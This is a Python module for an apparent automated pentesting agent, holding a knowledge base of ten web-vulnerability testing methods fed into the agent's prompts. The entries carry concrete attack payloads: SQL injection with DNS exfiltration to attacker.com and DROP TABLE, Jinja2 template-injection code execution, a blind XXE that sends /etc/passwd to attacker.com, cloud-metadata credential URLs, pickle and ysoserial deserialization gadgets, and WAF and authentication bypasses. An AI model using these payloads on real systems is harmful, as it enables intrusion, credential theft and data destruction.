"""Web application vulnerability knowledge base.

Deep knowledge about web vulnerabilities injected into agent prompts:
1. OWASP Top 10 2021 detailed testing methodology
2. Advanced injection techniques
3. Authentication and session management
4. SSRF exploitation chains
5. Deserialization attack patterns
6. Template injection (SSTI)
7. Race condition exploitation
8. Cache poisoning
9. HTTP request smuggling
10. Prototype pollution
"""

from __future__ import annotations

from collections import defaultdict
from dataclasses import dataclass, field
from typing import Any

import structlog

logger = structlog.get_logger()


@dataclass
class WebVulnPattern:
    """A web vulnerability pattern with testing methodology."""
    pattern_id: str = ""
    name: str = ""
    category: str = ""
    owasp_category: str = ""
    severity: str = "medium"
    description: str = ""
    testing_methodology: str = ""   # Injected into agent prompts
    detection_indicators: list[str] = field(default_factory=list)
    exploitation_notes: str = ""
    tools: list[str] = field(default_factory=list)
    cwe_ids: list[str] = field(default_factory=list)
    real_world_examples: list[str] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        return {
            "id": self.pattern_id,
            "name": self.name[:30],
            "category": self.category[:15],
            "severity": self.severity,
        }


# ── Web Vulnerability Patterns ────────────────────────────────

WEB_VULN_PATTERNS: list[dict[str, Any]] = [
    # ── Injection ──
    {
        "id": "web-001", "name": "Advanced SQL Injection",
        "category": "injection", "owasp": "A03:2021", "severity": "critical",
        "desc": "SQL injection beyond basic UNION/error-based — covering time-based blind, boolean blind, stacked queries, second-order, and OOB.",
        "testing": (
            "ADVANCED SQLi TESTING METHODOLOGY:\n"
            "1. IDENTIFY INJECTION POINTS: All user inputs (GET/POST params, headers "
            "(X-Forwarded-For, Referer, Cookie), JSON/XML body, path segments)\n"
            "2. FINGERPRINT DATABASE: Error-based (syntax errors differ between MySQL/MSSQL/PostgreSQL/Oracle), "
            "version functions (@@version, version(), v$version)\n"
            "3. BOOLEAN-BASED BLIND: Send ' AND 1=1-- and ' AND 1=2-- compare response length/content\n"
            "4. TIME-BASED BLIND: ' AND SLEEP(5)-- (MySQL), '; WAITFOR DELAY '0:0:5'-- (MSSQL), "
            "' AND pg_sleep(5)-- (PostgreSQL)\n"
            "5. SECOND-ORDER: Input stored in DB, triggered later (e.g., register with SQLi username, "
            "trigger when admin views users)\n"
            "6. OUT-OF-BAND: ' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',@@version,'.attacker.com\\\\a'))-- "
            "(DNS exfiltration)\n"
            "7. WAF BYPASS: case alternation (sElEcT), comments (SEL/**/ECT), "
            "encoding (URL, hex, unicode), chunked transfer\n"
            "8. STACKED QUERIES: '; DROP TABLE--; (if driver supports multi-statement)"
        ),
        "indicators": ["SQL syntax error", "Unclosed quotation mark", "mysql_fetch", "pg_query", "ORA-"],
        "exploit": "After confirming injection: extract schema (information_schema), dump tables, read files (LOAD_FILE), write files (INTO OUTFILE), execute OS commands (xp_cmdshell on MSSQL, sys_exec on MySQL UDF)",
        "tools": ["sqlmap", "Burp Suite"],
        "cwes": ["CWE-89"],
    },
    {
        "id": "web-002", "name": "Server-Side Template Injection (SSTI)",
        "category": "injection", "owasp": "A03:2021", "severity": "critical",
        "desc": "User input rendered in server-side templates (Jinja2, Twig, Freemarker, Pebble, etc.).",
        "testing": (
            "SSTI TESTING METHODOLOGY:\n"
            "1. DETECT: Send mathematical expressions: {{7*7}}, ${7*7}, #{7*7}, *{7*7}\n"
            "   If response shows '49', template engine is executing input\n"
            "2. IDENTIFY ENGINE:\n"
            "   - Jinja2: {{7*'7'}} → '7777777' (string multiplication)\n"
            "   - Twig: {{7*'7'}} → '49' (integer multiplication)\n"
            "   - Freemarker: ${7*7} → '49'\n"
            "   - Pebble: {{7*7}} → '49'\n"
            "3. EXPLOIT (Jinja2 RCE):\n"
            "   {{config.__class__.__init__.__globals__['os'].popen('id').read()}}\n"
            "   {{request.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}\n"
            "4. EXPLOIT (Twig RCE):\n"
            "   {{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}\n"
            "5. SANDBOX BYPASS: Use MRO (Method Resolution Order) to traverse Python class hierarchy"
        ),
        "indicators": ["Template rendering error", "Jinja2", "Twig", "Freemarker"],
        "exploit": "SSTI → RCE is almost always possible. From RCE: reverse shell, data exfiltration.",
        "tools": ["tplmap", "Burp Suite"],
        "cwes": ["CWE-94"],
    },
    {
        "id": "web-003", "name": "Advanced SSRF",
        "category": "injection", "owasp": "A10:2021", "severity": "high",
        "desc": "Server-side request forgery with advanced bypass techniques.",
        "testing": (
            "ADVANCED SSRF TESTING:\n"
            "1. FIND SSRF SINKS: URL parameters, file import, webhook URLs, PDF generators, "
            "image fetchers, OAuth callbacks, import/export features\n"
            "2. BASIC TEST: Replace URL with http://127.0.0.1 or http://169.254.169.254\n"
            "3. FILTER BYPASS:\n"
            "   - Decimal IP: http://2130706433 (= 127.0.0.1)\n"
            "   - Hex IP: http://0x7f000001\n"
            "   - Octal IP: http://0177.0.0.1\n"
            "   - IPv6: http://[::1], http://[0:0:0:0:0:ffff:127.0.0.1]\n"
            "   - DNS rebinding: Use attacker-controlled DNS with short TTL\n"
            "   - URL encoding: http://%31%32%37%2e%30%2e%30%2e%31\n"
            "   - Redirect: http://attacker.com/redirect?url=http://internal\n"
            "4. CLOUD METADATA:\n"
            "   - AWS: http://169.254.169.254/latest/meta-data/iam/security-credentials/\n"
            "   - GCP: http://metadata.google.internal/computeMetadata/v1/\n"
            "   - Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01\n"
            "5. INTERNAL PORT SCAN: Iterate through ports on 127.0.0.1, detect different responses"
        ),
        "indicators": ["URL fetch", "External resource", "Import URL", "Webhook"],
        "exploit": "SSRF → Cloud credentials → Full account takeover. SSRF → Internal services → Lateral movement.",
        "tools": ["Burp Suite", "SSRFmap"],
        "cwes": ["CWE-918"],
    },

    # ── Authentication ──
    {
        "id": "web-004", "name": "Authentication Bypass Techniques",
        "category": "authentication", "owasp": "A07:2021", "severity": "critical",
        "desc": "Various techniques to bypass authentication mechanisms.",
        "testing": (
            "AUTH BYPASS TESTING:\n"
            "1. DEFAULT CREDENTIALS: admin/admin, admin/password, root/root, test/test\n"
            "2. SQL INJECTION LOGIN: username: admin'-- password: anything\n"
            "3. LDAP INJECTION: username: *)(&  or  *)(objectClass=*\n"
            "4. HTTP VERB TAMPERING: Change POST to GET, PUT, PATCH, DELETE, TRACE\n"
            "5. PATH TRAVERSAL BYPASS: /admin → /ADMIN, /admin/, /admin;, /admin..;/\n"
            "6. HEADER INJECTION: X-Original-URL: /admin, X-Rewrite-URL: /admin\n"
            "7. IP-BASED BYPASS: X-Forwarded-For: 127.0.0.1, X-Real-IP: 127.0.0.1\n"
            "8. TOKEN MANIPULATION: Modify JWT, change user ID in token, test alg:none\n"
            "9. FORCE BROWSING: Access admin pages directly without going through login\n"
            "10. RACE CONDITION: Send login + session requests simultaneously\n"
            "11. MFA BYPASS: Skip MFA step by directly accessing post-MFA endpoints"
        ),
        "indicators": ["Login form", "Authentication endpoint", "Token-based auth", "Session cookie"],
        "exploit": "Full account takeover, admin access, data breach.",
        "tools": ["Burp Suite", "hydra"],
        "cwes": ["CWE-287", "CWE-862"],
    },

    # ── Deserialization ──
    {
        "id": "web-005", "name": "Insecure Deserialization",
        "category": "deserialization", "owasp": "A08:2021", "severity": "critical",
        "desc": "Untrusted data deserialized without validation.",
        "testing": (
            "DESERIALIZATION TESTING:\n"
            "1. IDENTIFY: Look for serialized data in cookies, hidden form fields, API parameters\n"
            "   - Java: rO0AB (base64) or AC ED 00 05 (hex) = Java serialized\n"
            "   - PHP: a:2:{s:4:\"name\";s:5:\"admin\";} = PHP serialized\n"
            "   - Python: pickle data (80 02 63 hex prefix)\n"
            "   - .NET: AAEAAAD (base64) = .NET BinaryFormatter\n"
            "2. JAVA EXPLOITATION: Use ysoserial to generate payloads\n"
            "   java -jar ysoserial.jar CommonsCollections1 'id' | base64\n"
            "   Chain libraries: Commons-Collections, Spring, Groovy\n"
            "3. PHP EXPLOITATION: Manipulate object properties for magic method abuse\n"
            "   __wakeup(), __destruct(), __toString() chains\n"
            "4. PYTHON EXPLOITATION: pickle.loads() with __reduce__\n"
            "   import os; class Exploit: def __reduce__(self): return (os.system, ('id',))\n"
            "5. .NET EXPLOITATION: ysoserial.net with BinaryFormatter, ObjectStateFormatter"
        ),
        "indicators": ["Base64 in cookies/params", "rO0AB", "AAEAAAD", "PHP serialize format"],
        "exploit": "Deserialization → RCE in most cases. Direct code execution on the server.",
        "tools": ["ysoserial", "Burp Suite"],
        "cwes": ["CWE-502"],
    },

    # ── Request Smuggling ──
    {
        "id": "web-006", "name": "HTTP Request Smuggling",
        "category": "smuggling", "owasp": "A05:2021", "severity": "critical",
        "desc": "Frontend/backend disagreement on request boundaries.",
        "testing": (
            "REQUEST SMUGGLING TESTING:\n"
            "1. DETECT INFRASTRUCTURE: Is there a reverse proxy/CDN/WAF in front of the backend?\n"
            "2. CL.TE TEST (Content-Length wins on frontend, Transfer-Encoding on backend):\n"
            "   POST / HTTP/1.1\n"
            "   Content-Length: 13\n"
            "   Transfer-Encoding: chunked\n"
            "   \\r\\n0\\r\\n\\r\\nSMUGGLED\n"
            "3. TE.CL TEST (Transfer-Encoding wins on frontend, Content-Length on backend):\n"
            "   POST / HTTP/1.1\n"
            "   Content-Length: 3\n"
            "   Transfer-Encoding: chunked\n"
            "   \\r\\n8\\r\\nSMUGGLED\\r\\n0\\r\\n\\r\\n\n"
            "4. TE.TE TEST (Both use TE but parse differently): Obfuscate header:\n"
            "   Transfer-Encoding: chunked\\r\\nTransfer-Encoding: identity\n"
            "   Transfer-Encoding: xchunked\n"
            "   Transfer-Encoding: chunked\\t\n"
            "5. CONFIRM: Use timing differences — if smuggled request causes delay/error on next request\n"
            "6. EXPLOIT: Capture other users' requests, bypass WAF, poison cache"
        ),
        "indicators": ["Reverse proxy", "CDN", "Load balancer", "Multiple servers"],
        "exploit": "Hijack user sessions, bypass access controls, poison web cache, deliver XSS.",
        "tools": ["Burp Suite", "smuggler"],
        "cwes": ["CWE-444"],
    },

    # ── Race Conditions ──
    {
        "id": "web-007", "name": "Race Condition Exploitation",
        "category": "race_condition", "owasp": "A04:2021", "severity": "high",
        "desc": "TOCTOU (Time of Check to Time of Use) vulnerabilities in web applications.",
        "testing": (
            "RACE CONDITION TESTING:\n"
            "1. IDENTIFY TARGETS: Any operation that checks then acts:\n"
            "   - Balance check → deduction (double-spend)\n"
            "   - Coupon validation → application (reuse)\n"
            "   - Account creation → unique check (duplicate accounts)\n"
            "   - File upload → validation (bypass checks)\n"
            "2. SINGLE-ENDPOINT RACE: Send identical requests simultaneously\n"
            "   Use Burp Intruder with 'Pitchfork' attack or Turbo Intruder\n"
            "   Send 20-50 requests in parallel with same coupon code\n"
            "3. MULTI-ENDPOINT RACE: Two different endpoints racing:\n"
            "   Request A: Update email to attacker@evil.com\n"
            "   Request B: Send password reset to original email\n"
            "   If B reads email before A's write commits → reset goes to old email\n"
            "4. TOOLS: Turbo Intruder (Burp), race-the-web, racepwn\n"
            "5. LOOK FOR: Non-atomic database operations, missing locks, "
            "optimistic concurrency without proper retry"
        ),
        "indicators": ["Financial transaction", "Coupon/discount", "Account creation", "Inventory/stock"],
        "exploit": "Double-spend money, duplicate coupons, create duplicate accounts, bypass limits.",
        "tools": ["Burp Suite", "Turbo Intruder"],
        "cwes": ["CWE-362"],
    },

    # ── Cache Poisoning ──
    {
        "id": "web-008", "name": "Web Cache Poisoning",
        "category": "cache", "owasp": "A05:2021", "severity": "high",
        "desc": "Manipulate cached responses to serve malicious content to other users.",
        "testing": (
            "CACHE POISONING TESTING:\n"
            "1. IDENTIFY CACHE: Check for Age, X-Cache, CF-Cache-Status, X-Varnish headers\n"
            "2. FIND UNKEYED INPUTS: Headers that affect the response but aren't in the cache key:\n"
            "   X-Forwarded-Host, X-Host, X-Original-URL, X-Forwarded-Scheme\n"
            "3. TEST: Send request with unkeyed header → check if response reflects it → "
            "resend without header → check if cached response has the poisoned value\n"
            "4. TECHNIQUES:\n"
            "   - X-Forwarded-Host: attacker.com → <link href='//attacker.com/evil.js'>\n"
            "   - X-Forwarded-Scheme: http → force redirect to HTTP (then MITM)\n"
            "   - Fat GET: Include body in GET request, some servers process it\n"
            "   - Parameter cloaking: ?param=a&param=b (first vs last wins)\n"
            "5. CACHE KEY NORMALIZATION: Port, path normalization, case sensitivity\n"
            "6. ESCALATION: Poison → XSS payload → steal sessions of ALL users"
        ),
        "indicators": ["CDN", "Varnish", "Nginx cache", "Cloudflare", "Cache-Control"],
        "exploit": "Serve malicious content to all users visiting the cached URL.",
        "tools": ["Burp Suite", "Param Miner"],
        "cwes": ["CWE-444"],
    },

    # ── Prototype Pollution ──
    {
        "id": "web-009", "name": "Prototype Pollution",
        "category": "injection", "owasp": "A03:2021", "severity": "high",
        "desc": "Modifying JavaScript Object.prototype to affect all objects.",
        "testing": (
            "PROTOTYPE POLLUTION TESTING:\n"
            "1. SERVER-SIDE: Send JSON with __proto__:\n"
            "   {\"__proto__\": {\"isAdmin\": true}}\n"
            "   {\"constructor\": {\"prototype\": {\"isAdmin\": true}}}\n"
            "2. CHECK: See if subsequent responses include the injected property\n"
            "3. CLIENT-SIDE: Identify sinks that use user input in property assignments:\n"
            "   - URL fragment: #__proto__[isAdmin]=true\n"
            "   - Query param: ?__proto__[isAdmin]=true\n"
            "   - JSON body merge operations\n"
            "4. EXPLOIT: Depends on what properties are checked:\n"
            "   - isAdmin, role, authenticated → privilege escalation\n"
            "   - Shell, command → RCE (if child_process uses Object.assign)\n"
            "   - outputFunctionName → template injection in EJS\n"
            "5. GADGETS: Known vulnerable patterns in popular libraries:\n"
            "   - lodash.merge, jQuery.extend, deep-extend\n"
            "   - Express.js: qs parsing with allowPrototypes"
        ),
        "indicators": ["JSON merge", "Object.assign", "lodash", "deep merge"],
        "exploit": "Privilege escalation, XSS, or RCE depending on how properties are used.",
        "tools": ["Burp Suite", "PPScan"],
        "cwes": ["CWE-1321"],
    },

    # ── XXE ──
    {
        "id": "web-010", "name": "XML External Entity (XXE)",
        "category": "injection", "owasp": "A05:2021", "severity": "high",
        "desc": "XML parser processes external entity references.",
        "testing": (
            "XXE TESTING:\n"
            "1. IDENTIFY XML INPUT: File upload (SVG, DOCX, XLSX), SOAP, XML-RPC, RSS\n"
            "2. BASIC XXE (file read):\n"
            "   <?xml version=\"1.0\"?>\n"
            "   <!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n"
            "   <root>&xxe;</root>\n"
            "3. BLIND XXE (OOB):\n"
            "   <!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">%xxe;]>\n"
            "   evil.dtd: <!ENTITY % file SYSTEM \"file:///etc/passwd\">\n"
            "   <!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>\">\n"
            "   %eval; %exfil;\n"
            "4. ERROR-BASED XXE: Force error messages that include file contents\n"
            "5. XXE → SSRF: <!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">\n"
            "6. XXE via file upload: Embed XXE in SVG, DOCX (unzip, modify XML, re-zip)"
        ),
        "indicators": ["XML", "SOAP", "SVG upload", "DOCX/XLSX", "application/xml"],
        "exploit": "File read, SSRF, denial of service (billion laughs), port scanning.",
        "tools": ["Burp Suite", "XXEinjector"],
        "cwes": ["CWE-611"],
    },
]


class WebAppVulnKB:
    """Web application vulnerability knowledge base.

    Provides deep testing methodology that gets injected into
    agent prompts for comprehensive web vulnerability assessment.
    """

    def __init__(self) -> None:
        self._patterns: dict[str, WebVulnPattern] = {}
        self._log = logger.bind(component="webapp_vuln_kb")
        self._load_patterns()

    def _load_patterns(self) -> None:
        """Load vulnerability patterns."""
        for data in WEB_VULN_PATTERNS:
            pattern = WebVulnPattern(
                pattern_id=data["id"],
                name=data["name"],
                category=data["category"],
                owasp_category=data.get("owasp", ""),
                severity=data.get("severity", "medium"),
                description=data.get("desc", ""),
                testing_methodology=data.get("testing", ""),
                detection_indicators=data.get("indicators", []),
                exploitation_notes=data.get("exploit", ""),
                tools=data.get("tools", []),
                cwe_ids=data.get("cwes", []),
            )
            self._patterns[pattern.pattern_id] = pattern

    def get_testing_prompts(
        self,
        categories: list[str] | None = None,
        max_patterns: int = 5,
    ) -> list[str]:
        """Get testing methodology prompts for injection into agent context."""
        prompts = []
        for pattern in self._patterns.values():
            if categories and pattern.category not in categories:
                continue
            if pattern.testing_methodology:
                prompts.append(pattern.testing_methodology)
            if len(prompts) >= max_patterns:
                break
        return prompts

    def get_patterns_for_tech(
        self,
        technologies: list[str],
    ) -> list[WebVulnPattern]:
        """Get patterns relevant to detected technologies."""
        tech_lower = [t.lower() for t in technologies]
        relevant = []

        tech_category_map = {
            "injection": ["php", "python", "ruby", "java", "node", "asp"],
            "deserialization": ["java", "php", "python", ".net", "spring"],
            "smuggling": ["nginx", "apache", "haproxy", "cloudflare"],
            "cache": ["varnish", "nginx", "cloudflare", "fastly"],
        }

        for category, keywords in tech_category_map.items():
            if any(kw in t for kw in keywords for t in tech_lower):
                for pattern in self._patterns.values():
                    if pattern.category == category:
                        relevant.append(pattern)

        return relevant

    def build_testing_prompt(
        self,
        target_type: str = "",
        technologies: list[str] | None = None,
        max_patterns: int = 3,
    ) -> str:
        """Build a comprehensive testing prompt."""
        relevant = []

        if technologies:
            relevant = self.get_patterns_for_tech(technologies)

        if not relevant:
            relevant = list(self._patterns.values())

        lines = ["## Web Vulnerability Testing Methodology\n"]
        for pattern in relevant[:max_patterns]:
            lines.append(f"### {pattern.name} [{pattern.severity.upper()}]")
            lines.append(pattern.testing_methodology)
            if pattern.tools:
                lines.append(f"Tools: {', '.join(pattern.tools)}")
            lines.append("")

        return "\n".join(lines)

    def get_pattern(self, pattern_id: str) -> WebVulnPattern | None:
        return self._patterns.get(pattern_id)

    def get_stats(self) -> dict[str, Any]:
        cat_counts: dict[str, int] = defaultdict(int)
        for p in self._patterns.values():
            cat_counts[p.category] += 1
        return {
            "patterns": len(self._patterns),
            "by_category": dict(cat_counts),
        }
